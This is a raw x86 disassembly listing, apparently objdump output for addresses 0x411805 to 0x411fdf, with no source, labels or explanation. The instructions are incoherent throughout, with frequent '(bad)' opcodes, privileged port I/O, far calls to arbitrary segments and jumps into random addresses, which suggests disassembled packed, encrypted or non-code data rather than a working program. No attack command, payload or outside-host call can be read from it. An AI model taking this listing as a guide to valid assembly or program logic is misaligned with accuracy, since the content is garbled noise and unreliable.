  411805:	daa    
  411806:	ret    0x79cc
  411809:	aam    0xbd
  41180b:	call   0x8e32:0x7310181e
  411812:	stc    
  411813:	aaa    
  411814:	(bad)  
  411816:	xor    al,0x4b
  411818:	dec    esp
  411819:	fcom   QWORD PTR [edi+0x145cf631]
  41181f:	jno    0x411869
  411821:	scas   eax,DWORD PTR es:[edi]
  411822:	inc    edi
  411823:	mov    eax,0x2d724b3d
  411828:	sbb    BYTE PTR [ecx-0x75d2ca51],cl
  41182e:	mov    ds:0x9c292901,al
  411833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411834:	dec    ecx
  411835:	push   0x42
  411837:	sub    BYTE PTR [eax-0x64],dl
  41183a:	mov    esp,0xa2f8b0fb
  41183f:	das    
  411840:	(bad)  
  411841:	sub    al,0xea
  411843:	enter  0xf0,0xe8
  411847:	cmp    DWORD PTR [ebp+0x4],ebp
  41184a:	aas    
  41184b:	xor    bh,bl
  41184d:	mov    bh,0x56
  41184f:	(bad)  
  411850:	lods   al,BYTE PTR ss:[esi]
  411852:	int    0x56
  411854:	mov    ebp,0xe7a0e276
  411859:	pushf  
  41185a:	retf   
  41185b:	jmp    0x41186e
  41185d:	add    cl,ch
  41185f:	and    BYTE PTR [edx],dl
  411861:	cmp    DWORD PTR [ebx-0x599d3db3],0xffffffde
  411868:	test   BYTE PTR [esi-0x39],0x7b
  41186c:	(bad)  
  41186d:	cmp    BYTE PTR [ebp+0x44b36585],dh
  411873:	sbb    DWORD PTR [edx+0x5f],ecx
  411876:	add    DWORD PTR [ebp+0x70fc950e],0xfee8afc1
  411880:	mov    ch,0x48
  411882:	jg     0x411851
  411884:	aam    0x85
  411886:	xchg   ebp,eax
  411887:	cmp    BYTE PTR [ebp-0x39cc2413],cl
  41188d:	pop    esp
  41188e:	repnz sbb dl,0xa8
  411892:	fnstenv [ecx+0x79]
  411895:	repz mov al,ds:0xe5cc558b
  41189b:	or     BYTE PTR [ecx-0x60],cl
  41189e:	cwde   
  41189f:	push   edx
  4118a0:	arpl   WORD PTR [esi+0x5f],bx
  4118a3:	aam    0xd7
  4118a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a6:	push   cs
  4118a7:	sbb    BYTE PTR [edx+0x78],0x6d
  4118ab:	sub    eax,0xd1483cc3
  4118b0:	stos   BYTE PTR es:[edi],al
  4118b1:	add    esi,edi
  4118b3:	ret    0xafeb
  4118b6:	mov    ecx,0xc93c7e8e
  4118bb:	(bad)
  4118bf:	mov    edi,0x76d042fb
  4118c4:	push   ss
  4118c5:	ss or  eax,0xe1f3f87e
  4118cb:	sub    BYTE PTR [edi-0x39],ah
  4118ce:	push   edx
  4118cf:	and    esi,DWORD PTR [eax+0x666f096b]
  4118d5:	mov    ch,BYTE PTR [ebp-0x7ac986d]
  4118db:	stos   DWORD PTR es:[edi],eax
  4118dc:	mul    bh
  4118de:	in     al,0xd9
  4118e0:	or     dh,BYTE PTR [ebx]
  4118e2:	scas   eax,DWORD PTR es:[edi]
  4118e3:	popf   
  4118e4:	mov    esi,0xa8df7692
  4118e9:	xor    eax,ecx
  4118eb:	loopne 0x4118e1
  4118ed:	leave  
  4118ee:	push   esp
  4118ef:	jle    0x4118e5
  4118f1:	xor    bl,BYTE PTR [esp+ecx*1+0x60]
  4118f5:	pushf  
  4118f6:	loop   0x411901
  4118f8:	xor    BYTE PTR [ecx+0x634daaac],0xea
  4118ff:	je     0x41192e
  411901:	pop    ds
  411902:	or     edi,ebp
  411904:	mov    edx,0x2232e61b
  411909:	pop    DWORD PTR [ebx+0x403e7bc7]
  41190f:	jge    0x4118a6
  411911:	(bad)  
  411912:	test   eax,0xa32927f4
  411917:	inc    ebp
  411918:	fucomi st,st(5)
  41191a:	int3   
  41191b:	jge    0x411950
  41191d:	jp     0x411952
  41191f:	loopne 0x411942
  411921:	xchg   edi,eax
  411922:	leave  
  411923:	cmp    DWORD PTR [ebp+0x48],esp
  411926:	and    eax,0xacc94713
  41192b:	sub    ah,BYTE PTR [edx-0x115d7d31]
  411931:	push   esp
  411932:	and    eax,0x774afc59
  411937:	rcr    BYTE PTR [ecx],0xbd
  41193a:	jle    0x411918
  41193c:	lds    esi,FWORD PTR [edx]
  41193e:	jmp    0x5d13007
  411943:	pop    es
  411944:	outs   dx,BYTE PTR ds:[esi]
  411945:	xor    eax,0x1989f87a
  41194a:	test   eax,0xf0a8f7d4
  41194f:	inc    edi
  411950:	sbb    eax,0xad97a399
  411955:	fadd   DWORD PTR [eax]
  411957:	inc    esp
  411958:	sbb    eax,0xfdcd4e19
  41195d:	mov    al,0x18
  41195f:	adc    BYTE PTR [edi+ecx*8-0x11d12137],al
  411966:	iret   
  411967:	das    
  411968:	in     eax,dx
  411969:	xchg   edx,eax
  41196a:	(bad)  
  41196b:	sti    
  41196c:	or     esp,edi
  41196e:	inc    ecx
  41196f:	inc    edx
  411970:	fld    DWORD PTR [edx]
  411972:	outs   dx,DWORD PTR ds:[esi]
  411973:	xor    al,0xa9
  411975:	das    
  411976:	rcr    BYTE PTR [esi+0x6d8dd897],0xeb
  41197d:	dec    ecx
  41197e:	iret   
  41197f:	test   BYTE PTR [edx-0x2be2a3f1],0xd4
  411986:	push   ss
  411987:	or     al,0xee
  411989:	add    DWORD PTR [ebp-0x25],ebx
  41198c:	sar    BYTE PTR [edx],0x53
  41198f:	ins    BYTE PTR es:[edi],dx
  411990:	imul   esi,ebp,0x3a14e6e8
  411996:	pop    esp
  411997:	arpl   WORD PTR [edi+0x76],si
  41199a:	mov    bl,0x13
  41199c:	and    eax,0x3ff4c468
  4119a1:	(bad)  
  4119a2:	inc    ecx
  4119a3:	sub    ch,BYTE PTR [esi]
  4119a5:	(bad)  
  4119a6:	in     eax,0x84
  4119a8:	inc    ebx
  4119a9:	in     eax,dx
  4119aa:	lea    eax,[ecx-0x3822633a]
  4119b0:	jae    0x411973
  4119b2:	fwait
  4119b3:	repnz pop ss
  4119b5:	inc    edi
  4119b6:	mov    WORD PTR [ebx],ss
  4119b8:	mov    ds:0x95158901,eax
  4119bd:	shl    ebp,0xec
  4119c0:	lods   al,BYTE PTR ds:[esi]
  4119c1:	(bad)  
  4119c2:	in     eax,0xe8
  4119c4:	inc    esp
  4119c5:	popa   
  4119c6:	and    ah,dl
  4119c8:	cmp    eax,0xa1b0b821
  4119cd:	inc    edi
  4119ce:	pop    ebx
  4119cf:	mov    ds:0x8460ddf3,eax
  4119d4:	and    DWORD PTR [ebp+0x71],ebx
  4119d7:	xchg   edi,eax
  4119d8:	push   eax
  4119d9:	sar    DWORD PTR [edx],1
  4119db:	and    eax,0x43aa9a34
  4119e0:	outs   dx,DWORD PTR ds:[esi]
  4119e1:	add    BYTE PTR [ebp+0x4685415e],ah
  4119e7:	lock push 0x55
  4119ea:	ins    DWORD PTR es:[edi],dx
  4119eb:	sub    eax,0x151d9ccb
  4119f0:	aaa    
  4119f1:	ret    
  4119f2:	add    eax,0x90a27adc
  4119f7:	ins    BYTE PTR es:[edi],dx
  4119f8:	fstp   TBYTE PTR [esi+ecx*1-0x7a]
  4119fc:	cs or  al,0xec
  4119ff:	cmp    esp,esp
  411a01:	cdq    
  411a02:	jo     0x411a5a
  411a04:	aaa    
  411a05:	and    eax,0x343bdf13
  411a0a:	call   0xe252217b
  411a0f:	jb     0x4119b3
  411a11:	in     al,0xd2
  411a13:	test   al,0x37
  411a15:	jle    0x4119c1
  411a17:	scas   eax,DWORD PTR es:[edi]
  411a18:	ret    0x46cc
  411a1b:	in     eax,0xa6
  411a1d:	add    cl,ch
  411a1f:	fld    DWORD PTR [edi+0x38bdb039]
  411a25:	dec    esp
  411a26:	gs mov dl,0x2d
  411a29:	daa    
  411a2a:	mov    ebp,0x3a026b16
  411a2f:	loop   0x411a43
  411a31:	jmp    0xf0bc0e4d
  411a36:	sbb    al,0xf4
  411a38:	mov    BYTE PTR [ebp-0x17e321a9],dl
  411a3e:	adc    DWORD PTR [ebp+esi*1+0x434a0ed7],ebx
  411a45:	fdivp  st(5),st
  411a47:	xchg   ebp,eax
  411a48:	jle    0x411a8b
  411a4a:	test   ebx,esi
  411a4c:	sub    esp,esp
  411a4e:	cld    
  411a4f:	cdq    
  411a50:	mov    dl,0x99
  411a52:	push   ebp
  411a53:	loopne 0x411a20
  411a55:	sub    eax,0x91ae98e0
  411a5a:	nop
  411a5b:	mov    edi,0x38427657
  411a60:	xchg   ecx,eax
  411a61:	pop    ebx
  411a62:	push   ecx
  411a63:	or     dh,BYTE PTR [ebx+0x23]
  411a66:	inc    ecx
  411a67:	dec    ecx
  411a68:	jecxz  0x411a74
  411a6a:	(bad)  
  411a6b:	pop    esp
  411a6c:	sbb    eax,0xd630cf1e
  411a71:	in     al,0x80
  411a73:	fsubr  QWORD PTR [ebx]
  411a75:	pop    ebp
  411a76:	iret   
  411a77:	push   esp
  411a78:	out    0x8e,al
  411a7a:	dec    esp
  411a7b:	cmp    ecx,ebx
  411a7d:	cdq    
  411a7e:	enter  0x6456,0xb4
  411a82:	or     BYTE PTR [ecx-0x593cd0b4],bh
  411a88:	sub    al,0xc8
  411a8a:	pop    ecx
  411a8b:	jae    0x411aa4
  411a8d:	in     al,0x2b
  411a8f:	jo     0x411a17
  411a91:	pop    esp
  411a92:	in     eax,dx
  411a93:	fld    DWORD PTR [edx+0x66cade47]
  411a99:	push   cs
  411a9a:	push   ds
  411a9b:	sbb    ecx,DWORD PTR [ebx-0x3bb3b18c]
  411aa1:	nop
  411aa2:	inc    eax
  411aa3:	or     ebp,DWORD PTR [esi-0x6e]
  411aa6:	loope  0x411a4c
  411aa8:	data16 sub BYTE PTR [ecx-0x74],bh
  411aac:	xchg   ebp,eax
  411aad:	dec    edx
  411aae:	xchg   ebx,eax
  411aaf:	call   0x3620c0e7
  411ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab5:	scas   al,BYTE PTR es:[edi]
  411ab6:	leave  
  411ab7:	test   esi,ebp
  411ab9:	js     0x411a63
  411abb:	in     al,dx
  411abc:	in     eax,0x9f
  411abe:	mov    esp,0xaf49c6f8
  411ac3:	cld    
  411ac4:	jne    0x411a88
  411ac6:	jmp    0x411aff
  411ac8:	sbb    eax,DWORD PTR [esi+0x2f6c1623]
  411ace:	pop    fs
  411ad0:	add    BYTE PTR [ebx+0x39],dh
  411ad3:	jle    0x411a96
  411ad5:	pop    esi
  411ad6:	fsubp  st(5),st
  411ad8:	loope  0x411a91
  411ada:	dec    esp
  411adb:	mov    eax,0x865e4bad
  411ae0:	stos   BYTE PTR es:[edi],al
  411ae1:	jb     0x411a87
  411ae3:	inc    esi
  411ae4:	and    DWORD PTR [edx],ecx
  411ae6:	xchg   ecx,eax
  411ae7:	adc    al,0xb4
  411ae9:	or     eax,0x278f6377
  411aee:	test   BYTE PTR [edx],ch
  411af0:	(bad)
  411af4:	pop    esp
  411af5:	rcr    DWORD PTR [esi+0x41fa41cd],0x3a
  411afc:	mov    bh,0xcf
  411afe:	fistp  DWORD PTR [edx+0x59]
  411b01:	js     0x411b0e
  411b03:	dec    edx
  411b04:	dec    ecx
  411b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b06:	pop    esi
  411b07:	add    al,BYTE PTR [esi-0x1f]
  411b0a:	xor    edi,ecx
  411b0c:	test   BYTE PTR ds:0x652e3d68,dl
  411b12:	mov    eax,ds:0x60b3c54d
  411b17:	pusha  
  411b18:	iret   
  411b19:	ret    0xfd10
  411b1c:	daa    
  411b1d:	inc    ebx
  411b1e:	or     DWORD PTR [ebx+ecx*1],edx
  411b21:	push   edi
  411b22:	out    0xa5,al
  411b24:	xchg   esi,eax
  411b25:	jge    0x411b0f
  411b27:	hlt    
  411b28:	jl     0x411ba7
  411b2a:	or     DWORD PTR ds:0x7e71a656,esi
  411b30:	(bad)
  411b34:	xor    bl,BYTE PTR [edx-0x55]
  411b37:	mov    eax,ds:0xcd49aef2
  411b3c:	cmp    dl,BYTE PTR [ebx]
  411b3e:	repnz sub BYTE PTR [ebp+0xcc9a8c1],0x32
  411b46:	dec    ebp
  411b47:	jl     0x411baa
  411b49:	xchg   ecx,eax
  411b4a:	xor    BYTE PTR [ebx-0x3e],dl
  411b4d:	jmp    0x8a3ba673
  411b52:	fisub  DWORD PTR [ebp-0x44d5ac3b]
  411b58:	pop    ebp
  411b59:	mov    BYTE PTR [ecx],al
  411b5b:	pushf  
  411b5c:	xchg   DWORD PTR [edx+0x3e],edi
  411b5f:	fidiv  DWORD PTR [esi+0x3e]
  411b62:	call   0x474f662b
  411b67:	ret    0x9e7
  411b6a:	icebp  
  411b6b:	mov    ebx,0x98cc3605
  411b70:	popa   
  411b71:	fstp   st(4)
  411b73:	aas    
  411b74:	mov    bl,0xca
  411b76:	pop    ss
  411b77:	bound  esp,QWORD PTR ds:0xb73c6c8
  411b7d:	sub    eax,0x5f2e2961
  411b82:	cmp    esi,0x25
  411b85:	push   edi
  411b86:	fst    DWORD PTR [ecx-0x76]
  411b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8a:	mov    eax,ds:0xa2d2d2a5
  411b8f:	shr    BYTE PTR [edx],1
  411b91:	sub    al,0xcb
  411b93:	adc    BYTE PTR [ebp-0x4f],al
  411b96:	ds daa 
  411b98:	gs dec ecx
  411b9a:	push   ebp
  411b9b:	and    eax,0x4d7e8296
  411ba0:	(bad)  
  411ba1:	loope  0x411b57
  411ba3:	jo     0x411b87
  411ba5:	cmc    
  411ba6:	pushf  
  411ba7:	rcl    bh,cl
  411ba9:	dec    ecx
  411baa:	imul   ebp,DWORD PTR [ebp-0x54],0x3e6c605b
  411bb1:	xor    bh,BYTE PTR [ebp+0x60]
  411bb4:	push   es
  411bb5:	adc    al,0xec
  411bb7:	mov    bh,0x75
  411bb9:	inc    edi
  411bba:	jmp    0x7e3d:0x4eb2147a
  411bc1:	lds    edi,FWORD PTR [ebx-0x3a078]
  411bc7:	xchg   esp,eax
  411bc8:	push   esi
  411bc9:	aad    0xf0
  411bcb:	sbb    dl,BYTE PTR [eax-0x2a6685c4]
  411bd1:	repz ja 0x411c33
  411bd4:	jbe    0x411b9d
  411bd6:	jbe    0x411bb9
  411bd8:	addr16 adc al,0xec
  411bdb:	js     0x411bab
  411bdd:	in     al,0x95
  411bdf:	sub    eax,0xa7e1e1cb
  411be4:	into   
  411be5:	icebp  
  411be6:	cli    
  411be7:	ja     0x411bcf
  411be9:	mov    DWORD PTR [ebx-0x5e],eax
  411bec:	leave  
  411bed:	ja     0x411b71
  411bef:	das    
  411bf0:	xchg   edx,eax
  411bf1:	or     eax,0x1bb97b55
  411bf6:	mov    ebx,DWORD PTR [ecx]
  411bf8:	push   ss
  411bf9:	push   ss
  411bfa:	mov    WORD PTR [ecx-0x24],gs
  411bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bfe:	dec    ebp
  411bff:	xor    ch,BYTE PTR ds:[esi-0x6a]
  411c03:	fmul   QWORD PTR [edi+0x40]
  411c06:	jnp    0x411ba1
  411c08:	sub    DWORD PTR [esi],edi
  411c0a:	aad    0x7f
  411c0c:	cmp    edx,DWORD PTR [edx+0x43]
  411c0f:	loop   0x411bf1
  411c11:	or     eax,0x5fe30e6a
  411c16:	loop   0x411c84
  411c18:	pusha  
  411c19:	mov    ecx,0x162c6b7e
  411c1e:	jl     0x411c0e
  411c20:	mov    ebp,0x5c00b7bb
  411c25:	enter  0x74d4,0x6
  411c29:	mul    esp
  411c2b:	xchg   esi,eax
  411c2c:	pop    ebx
  411c2d:	cmp    edi,edi
  411c2f:	fstp   QWORD PTR [edx+eiz*8-0x164366d9]
  411c36:	sbb    al,BYTE PTR [edx-0x23]
  411c39:	xor    eax,0x9bfdf328
  411c3e:	mov    eax,0xf52ea80b
  411c43:	ins    BYTE PTR es:[edi],dx
  411c44:	ret    0x84
  411c47:	enter  0x5ec7,0x2a
  411c4b:	inc    edx
  411c4c:	push   ds
  411c4d:	pop    ss
  411c4e:	lock test al,0x82
  411c51:	pop    es
  411c52:	dec    edi
  411c53:	or     DWORD PTR [ecx],eax
  411c55:	in     eax,0x27
  411c57:	(bad)  
  411c58:	jecxz  0x411c9e
  411c5a:	(bad)  
  411c5b:	pop    ebp
  411c5c:	mov    cl,0x7a
  411c5e:	repz ss pusha 
  411c61:	mov    ah,0xee
  411c63:	fistp  QWORD PTR [esi+0x26428fc1]
  411c69:	jbe    0x411c6d
  411c6b:	sub    ah,al
  411c6d:	loopne 0x411cd3
  411c6f:	jne    0x411cb2
  411c71:	xchg   esp,eax
  411c72:	mov    esp,0x82d65f9e
  411c77:	jmp    0x4744bfa8
  411c7c:	xchg   esi,eax
  411c7d:	cmp    BYTE PTR [ecx-0x1],al
  411c80:	shr    DWORD PTR [esi+0x758c00fc],1
  411c86:	inc    ecx
  411c87:	jns    0x411c29
  411c89:	outs   dx,DWORD PTR ds:[esi]
  411c8a:	xchg   esi,eax
  411c8b:	arpl   WORD PTR [ebp+0x9c0fdde],cx
  411c91:	bound  ebp,QWORD PTR [edx+0x262f93a]
  411c97:	adc    DWORD PTR [ebx],eax
  411c99:	mov    eax,ds:0xb3092ac8
  411c9e:	xchg   ecx,eax
  411c9f:	ficom  DWORD PTR [ecx]
  411ca1:	xlat   BYTE PTR ds:[ebx]
  411ca2:	dec    edi
  411ca3:	ja     0x411c60
  411ca5:	call   0x7124:0xf3c34ba2
  411cac:	and    DWORD PTR [eax+0x13],edx
  411caf:	ret    0x87c6
  411cb2:	arpl   dx,dx
  411cb4:	dec    edi
  411cb5:	inc    ebp
  411cb6:	leave  
  411cb7:	adc    DWORD PTR [ebx],edx
  411cb9:	push   ebp
  411cba:	lds    ebp,FWORD PTR [ecx-0x12]
  411cbd:	dec    esi
  411cbe:	fsubr  st(2),st
  411cc0:	out    0xab,eax
  411cc2:	mov    bl,0x8f
  411cc4:	rol    DWORD PTR [edi],1
  411cc6:	push   cs
  411cc7:	xchg   esi,eax
  411cc8:	pop    eax
  411cc9:	and    ebx,DWORD PTR ds:0xbdd9f0d4
  411ccf:	addr16 ret 0x1ead
  411cd3:	push   edi
  411cd4:	icebp  
  411cd5:	jmp    0x411ca1
  411cd7:	lods   al,BYTE PTR ds:[esi]
  411cd8:	cld    
  411cd9:	inc    eax
  411cda:	cmp    DWORD PTR [esi+ebp*1-0x14],eax
  411cde:	jmp    0x250e:0xab13941
  411ce5:	mov    ?,WORD PTR [esi-0x59]
  411ce8:	pop    esp
  411ce9:	jns    0x411c8c
  411ceb:	std    
  411cec:	mov    eax,ds:0x7e0c12cb
  411cf1:	aad    0xb7
  411cf3:	push   ds
  411cf4:	aaa    
  411cf5:	mov    al,0xeb
  411cf7:	and    ch,al
  411cf9:	adc    eax,0xe383df7c
  411cfe:	cld    
  411cff:	xchg   ecx,eax
  411d00:	and    DWORD PTR [edx],0xae63787b
  411d06:	jns    0x411cdf
  411d08:	cs push es
  411d0a:	popa   
  411d0b:	jno    0x411d1c
  411d0d:	stc    
  411d0e:	or     DWORD PTR [edx+0xb9ff62c],ebp
  411d14:	pusha  
  411d15:	sub    ecx,ebx
  411d17:	lods   al,BYTE PTR ds:[esi]
  411d18:	cmp    ch,dl
  411d1a:	cs retf 
  411d1c:	jne    0x411d3c
  411d1e:	mov    edi,0xb7e8672b
  411d23:	xchg   esi,eax
  411d24:	cmp    DWORD PTR [ebp+0x6bdf01ad],eax
  411d2a:	pop    esi
  411d2b:	push   ebx
  411d2c:	shl    BYTE PTR [esi-0x7a],1
  411d2f:	xchg   edi,eax
  411d30:	shl    DWORD PTR [edx],cl
  411d32:	xor    esp,ebp
  411d34:	(bad)  
  411d35:	sub    DWORD PTR [edx-0x46],esp
  411d38:	xchg   esp,eax
  411d39:	(bad)  
  411d3b:	mov    ebp,0x1c08c248
  411d40:	clc    
  411d41:	and    al,0x67
  411d43:	and    BYTE PTR [ecx+0x58],ah
  411d46:	xor    BYTE PTR [ebx+edx*2-0x1ce8fcf5],bh
  411d4d:	test   BYTE PTR ds:0x7a608f48,al
  411d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d54:	test   BYTE PTR [ecx-0x59],bh
  411d57:	xlat   BYTE PTR ds:[ebx]
  411d58:	sbb    esi,DWORD PTR [edi+esi*2]
  411d5b:	gs jl  0x411d13
  411d5e:	cmp    bl,BYTE PTR [ecx]
  411d60:	out    dx,al
  411d61:	pop    eax
  411d62:	fst    st(6)
  411d64:	iret   
  411d65:	(bad)  [esi+eiz*8]
  411d68:	sbb    esi,ebp
  411d6a:	(bad)  [edx+0x34eafab4]
  411d70:	nop
  411d71:	push   ss
  411d72:	pop    edi
  411d73:	loope  0x411d93
  411d75:	enter  0x2882,0x12
  411d79:	test   DWORD PTR [edi+0x46],esp
  411d7c:	test   BYTE PTR [edx+0x5c0bc8ad],bh
  411d82:	push   DWORD PTR [ebp+edx*1+0x3678778c]
  411d89:	imul   ebx,DWORD PTR [edx-0x66],0x30
  411d8d:	adc    eax,0x362731c0
  411d92:	dec    esp
  411d93:	pusha  
  411d94:	std    
  411d95:	push   0xca1ee4a6
  411d9a:	push   ss
  411d9b:	add    eax,DWORD PTR [ebp+ebp*2-0x33da610]
  411da2:	and    ebp,DWORD PTR [ecx+ecx*4]
  411da5:	arpl   WORD PTR [ecx-0x50],bp
  411da8:	mov    al,0x5b
  411daa:	popf   
  411dab:	xor    al,0xf4
  411dad:	sti    
  411dae:	sti    
  411daf:	mov    edx,0x83e0a9f
  411db4:	mov    ebp,DWORD PTR [edx-0x4c]
  411db7:	mov    edx,DWORD PTR [edi+0x458f1248]
  411dbd:	mov    ch,0xf4
  411dbf:	inc    ebp
  411dc0:	jecxz  0x411dea
  411dc2:	mov    dh,0x2e
  411dc4:	mov    esp,0xaf33111d
  411dc9:	and    al,0x14
  411dcb:	mov    edx,ss
  411dcd:	sbb    ah,0x12
  411dd0:	mov    dh,0x9f
  411dd2:	das    
  411dd3:	sbb    al,0xe8
  411dd5:	and    esp,ecx
  411dd7:	mov    dl,0xda
  411dd9:	retf   0x55d4
  411ddc:	lods   al,BYTE PTR ds:[esi]
  411ddd:	sti    
  411dde:	fwait
  411ddf:	xchg   esi,eax
  411de0:	dec    edx
  411de1:	es push cs
  411de3:	ins    DWORD PTR es:[edi],dx
  411de4:	mov    esp,0x7d877e48
  411de9:	mov    bh,0xe7
  411deb:	ss jl  0x411daf
  411dee:	nop    DWORD PTR [eax-0x69]
  411df2:	(bad)  [ebx+edx*4+0x57]
  411df6:	mov    al,ds:0x6f2d8ee6
  411dfb:	pop    ebx
  411dfc:	fidiv  WORD PTR [eax-0x1c]
  411dff:	pop    ebp
  411e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e01:	and    eax,0x5b2ebdb0
  411e06:	xor    ch,dh
  411e08:	shl    eax,cl
  411e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0b:	rcl    ah,0x1a
  411e0e:	test   ebp,0x63710128
  411e14:	cli    
  411e15:	jp     0x411e13
  411e17:	aad    0x9
  411e19:	pusha  
  411e1a:	rcr    bl,0xee
  411e1d:	jne    0x411e53
  411e1f:	cwde   
  411e20:	mov    eax,ds:0xae18fbe8
  411e25:	retf   
  411e26:	shl    DWORD PTR [eax+eiz*4],cl
  411e29:	call   0x96bc:0xfc15551e
  411e30:	popf   
  411e31:	mov    bh,0xf1
  411e33:	dec    ebx
  411e34:	(bad)  
  411e35:	pop    esp
  411e36:	mov    esi,0x23e16e49
  411e3b:	and    al,0xff
  411e3d:	sub    bh,BYTE PTR [ebx-0x6a73c53c]
  411e43:	pop    es
  411e44:	adc    BYTE PTR [ecx+ebp*8+0xa],dl
  411e48:	imul   esi,DWORD PTR ds:0x1263fe47,0xb36f4a05
  411e52:	ret    0xa9f
  411e55:	pushf  
  411e56:	jle    0x411ec3
  411e58:	dec    esp
  411e59:	(bad)  
  411e5a:	sti    
  411e5b:	sbb    dh,BYTE PTR ds:0x7ba0ccd1
  411e61:	push   esp
  411e62:	xor    eax,0x52c9c5db
  411e67:	loopne 0x411dec
  411e69:	cmp    ebx,DWORD PTR [ecx]
  411e6b:	pop    ss
  411e6c:	fld    QWORD PTR [eax]
  411e6e:	sbb    al,0xd6
  411e70:	pop    eax
  411e71:	and    al,0x38
  411e73:	or     al,0x89
  411e75:	mov    eax,0x8304859e
  411e7a:	mov    eax,ds:0x61d2f378
  411e7f:	shl    BYTE PTR [ebx],cl
  411e81:	mov    esi,0xeebdd5a0
  411e86:	mov    eax,?
  411e88:	push   eax
  411e89:	jbe    0x411eef
  411e8b:	mov    al,BYTE PTR [esi+0x14]
  411e8e:	jge    0x411e41
  411e90:	aad    0x85
  411e92:	ds add esp,edx
  411e95:	sbb    dh,al
  411e97:	bswap  eax
  411e99:	scas   eax,DWORD PTR es:[edi]
  411e9a:	mov    cl,BYTE PTR [ebx-0x43a5d9b2]
  411ea0:	dec    esp
  411ea1:	jne    0x411e57
  411ea3:	ret    
  411ea4:	xchg   ecx,eax
  411ea5:	(bad)  [ecx-0x418ecf62]
  411eab:	arpl   si,bx
  411ead:	inc    ecx
  411eae:	fwait
  411eaf:	pop    es
  411eb0:	mov    esi,0x6f1b975
  411eb5:	test   DWORD PTR [ecx],edx
  411eb7:	and    al,0x8f
  411eb9:	fild   QWORD PTR [ecx+0x19]
  411ebc:	push   cs
  411ebd:	inc    edx
  411ebe:	sar    BYTE PTR ds:0x3f1b374,1
  411ec4:	jo     0x411f42
  411ec6:	out    0x91,al
  411ec8:	pop    es
  411ec9:	mov    bh,0x8e
  411ecb:	outs   dx,BYTE PTR ds:[esi]
  411ecc:	dec    eax
  411ecd:	cmp    DWORD PTR [ebx],ebx
  411ecf:	sub    al,0xf7
  411ed1:	sbb    eax,0xaad6c831
  411ed6:	ins    DWORD PTR es:[edi],dx
  411ed7:	add    edx,esp
  411ed9:	mov    ah,0xde
  411edb:	imul   esp,esp,0x2b
  411ede:	mov    esp,0x46e6e1aa
  411ee3:	imul   ecx,DWORD PTR [edx],0x830e4245
  411ee9:	add    BYTE PTR fs:[ecx-0x26bf6f3a],ah
  411ef0:	or     BYTE PTR [ebx+0x41],cl
  411ef3:	das    
  411ef4:	mov    esi,DWORD PTR [eax]
  411ef6:	daa    
  411ef7:	sbb    edi,eax
  411ef9:	mov    ah,bl
  411efb:	adc    DWORD PTR [ecx-0x5f8f519b],esi
  411f01:	push   esp
  411f02:	in     al,0x1b
  411f04:	add    BYTE PTR [ecx-0x6e],ah
  411f07:	nop
  411f08:	and    al,0xcb
  411f0a:	stos   BYTE PTR es:[edi],al
  411f0b:	push   cs
  411f0c:	imul   ebx,DWORD PTR [ecx],0xa
  411f0f:	popf   
  411f10:	mov    ss,WORD PTR [esi-0x67364c42]
  411f16:	jns    0x411f74
  411f18:	std    
  411f19:	in     eax,dx
  411f1a:	shl    DWORD PTR ds:0xf9564c6f,1
  411f20:	add    bl,al
  411f22:	imul   ebx,DWORD PTR [ebx+0x1b],0x989db73a
  411f29:	sbb    al,0xc8
  411f2b:	(bad)
  411f2e:	adc    BYTE PTR [ecx+0x43dc4a63],al
  411f34:	adc    ah,BYTE PTR [ebx+0x79e0865b]
  411f3a:	in     al,dx
  411f3b:	jno    0x411f00
  411f3d:	add    BYTE PTR [ebp-0x22],al
  411f40:	imul   edx,DWORD PTR [esi],0x5c966d2a
  411f46:	dec    ebx
  411f47:	mov    ecx,0xf3a3b1b4
  411f4c:	lds    ecx,FWORD PTR [ecx-0x4c]
  411f4f:	add    ecx,ebp
  411f51:	mov    dl,0x6d
  411f53:	sbb    dh,BYTE PTR [edi-0xd093770]
  411f59:	xor    eax,0x85b60496
  411f5e:	sbb    cl,BYTE PTR [eax-0x5655f090]
  411f64:	sub    DWORD PTR [eax],esi
  411f66:	test   DWORD PTR [ecx+edx*4+0x1f],ecx
  411f6a:	and    eax,0x74a7fe9f
  411f6f:	(bad)  
  411f70:	addr16 jo 0x411f12
  411f73:	aaa    
  411f74:	pop    ss
  411f75:	repnz xchg ecx,eax
  411f77:	and    al,0xad
  411f79:	push   ebp
  411f7a:	popf   
  411f7b:	sub    BYTE PTR [ecx],bh
  411f7d:	add    bl,BYTE PTR [ecx+0x1c]
  411f80:	pop    esi
  411f81:	popf   
  411f82:	pop    eax
  411f83:	pushf  
  411f84:	push   0x31
  411f86:	cmp    al,BYTE PTR [ecx-0x50e2add2]
  411f8c:	cmp    bh,BYTE PTR [ebp-0xfa1bf3c]
  411f92:	and    esp,0x6d
  411f95:	pop    edx
  411f96:	fs std 
  411f98:	and    DWORD PTR [ebx],0xffffffb3
  411f9b:	(bad)  
  411f9c:	mov    edx,0xcd4abbe7
  411fa1:	jnp    0x411f6a
  411fa3:	dec    ebx
  411fa4:	imul   ebx
  411fa6:	add    ebp,DWORD PTR [edi+0x1eb806a0]
  411fac:	pushf  
  411fad:	es or  eax,0xde2b599f
  411fb3:	inc    edi
  411fb4:	cmp    al,BYTE PTR [edx]
  411fb6:	mov    ah,0x68
  411fb8:	sub    al,0x44
  411fba:	sub    DWORD PTR [esi+edi*2],esi
  411fbd:	jl     0x412030
  411fbf:	mov    ebp,DWORD PTR [ebx+edx*1]
  411fc2:	popa   
  411fc3:	mov    al,0x5f
  411fc5:	mov    al,0x2b
  411fc7:	adc    BYTE PTR [edx],dh
  411fc9:	data16 (bad) 
  411fcb:	jno    0x41200d
  411fcd:	mov    cl,0xeb
  411fcf:	adc    al,0xf6
  411fd1:	pop    edi
  411fd2:	jp     0x411faa
  411fd4:	jne    0x41202f
  411fd6:	dec    ebx
  411fd7:	sub    BYTE PTR [ecx],ch
  411fd9:	(bad)  [eax-0x12120bd4]
  411fdf:	push   cs
